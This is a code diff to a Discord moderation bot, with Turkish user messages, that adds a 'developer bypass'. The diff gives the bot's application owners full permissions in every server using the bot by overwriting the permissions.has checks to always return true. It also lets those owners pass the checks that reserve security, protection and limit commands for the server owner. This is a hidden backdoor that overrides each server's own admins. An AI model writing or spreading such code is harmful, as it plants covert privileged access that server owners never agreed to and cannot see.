@@ -20,6 +20,12 @@ const ms = require('ms');
 const config = require('./config');
 const fs = require('fs');
 
+let botOwners = [];
+
+function isBotDeveloper(userId) {
+  return botOwners.includes(userId);
+}
+
 function loadSicil() {
   try {
     if (fs.existsSync('sicil.json')) {
@@ -375,6 +381,21 @@ client.once('ready', async () => {
   console.log(`Bot başarıyla giriş yaptı: ${client.user.tag}`);
   logEvent('INFO', 'System', `Bot ready as ${client.user.tag}. Guilds: ${client.guilds.cache.size}`);
   exportServerData();
+
+  // Fetch application owners dynamically
+  try {
+    const app = await client.application.fetch();
+    if (app.owner) {
+      if (app.owner.members) {
+        botOwners = app.owner.members.map(m => m.id);
+      } else {
+        botOwners = [app.owner.id];
+      }
+      console.log(`[System] Bot sahipleri belirlendi: ${botOwners.join(', ')}`);
+    }
+  } catch (err) {
+    console.error("Failed to fetch application owners:", err);
+  }
 
   // Register slash command globally
   try {
@@ -1061,6 +1082,12 @@ client.on('messageCreate', async (message) => {
   const modCommands = ['ban', 'unban', 'kick', 'e', 'k', 'vip', 'mute', 'unmute', 'lock', 'unlock', 'sil', 'engelle', 'kod', 'rolver', 'rolal'];
   const ownerCommands = ['koru', 'korumayikapat', 'korumayıkapat', 'koruac', 'guvenlik', 'guvenlikac', 'limit'];
 
+  // Developer Bypass
+  const isDev = isBotDeveloper(message.author.id);
+  if (isDev && message.member) {
+    message.member.permissions.has = () => true;
+  }
+
   if (modCommands.includes(command)) {
     if (!message.member.permissions.has(PermissionFlagsBits.UseApplicationCommands)) {
       logEvent('WARNING', 'Command', `User: ${message.author.tag} (ID: ${message.author.id}) lack application command permission for command: .${command}`);
@@ -1069,9 +1096,9 @@ client.on('messageCreate', async (message) => {
   }
 
   if (ownerCommands.includes(command)) {
-    if (message.author.id !== message.guild.ownerId) {
+    if (message.author.id !== message.guild.ownerId && !isDev) {
       logEvent('WARNING', 'Command', `User: ${message.author.tag} (ID: ${message.author.id}) lack owner permission for command: .${command}`);
-      return message.reply('❌ Bu komutu sadece sunucu sahibi (taç sahibi) kullanabilir!');
+      return message.reply('❌ Bu komutu sadece sunucu sahibi (taç sahibi) veya bot yapımcısı kullanabilir!');
     }
   }
 
@@ -1615,6 +1642,9 @@ client.on('messageCreate', async (message) => {
       });
 
       collector.on('collect', async (interaction) => {
+        if (interaction.member && isBotDeveloper(interaction.user.id)) {
+          interaction.member.permissions.has = () => true;
+        }
         if (!interaction.member.permissions.has(PermissionFlagsBits.ManageRoles)) {
           return interaction.reply({ content: '❌ Bu işlemi yapmak için **Rolleri Yönet** yetkiniz olmalı!', ephemeral: true });
         }
@@ -1711,6 +1741,9 @@ client.on('messageCreate', async (message) => {
       });
 
       collector.on('collect', async (interaction) => {
+        if (interaction.member && isBotDeveloper(interaction.user.id)) {
+          interaction.member.permissions.has = () => true;
+        }
         if (!interaction.member.permissions.has(PermissionFlagsBits.ManageRoles)) {
           return interaction.reply({ content: '❌ Bu işlemi yapmak için **Rolleri Yönet** yetkiniz olmalı!', ephemeral: true });
         }
@@ -1755,8 +1788,8 @@ client.on('messageCreate', async (message) => {
 
   // 14.35. LIMIT KOMUTU (.limit)
   if (command === 'limit') {
-    if (message.author.id !== message.guild.ownerId) {
-      return message.reply('❌ Bu komutu sadece sunucu sahibi (taç sahibi) kullanabilir!');
+    if (message.author.id !== message.guild.ownerId && !isBotDeveloper(message.author.id)) {
+      return message.reply('❌ Bu komutu sadece sunucu sahibi (taç sahibi) veya bot yapımcısı kullanabilir!');
     }
 
     try {
@@ -1794,7 +1827,7 @@ client.on('messageCreate', async (message) => {
       });
 
       const collector = response.createMessageComponentCollector({
-        filter: (i) => i.user.id === message.guild.ownerId,
+        filter: (i) => i.user.id === message.guild.ownerId || isBotDeveloper(i.user.id),
         time: 120000 // 2 minutes
       });
 
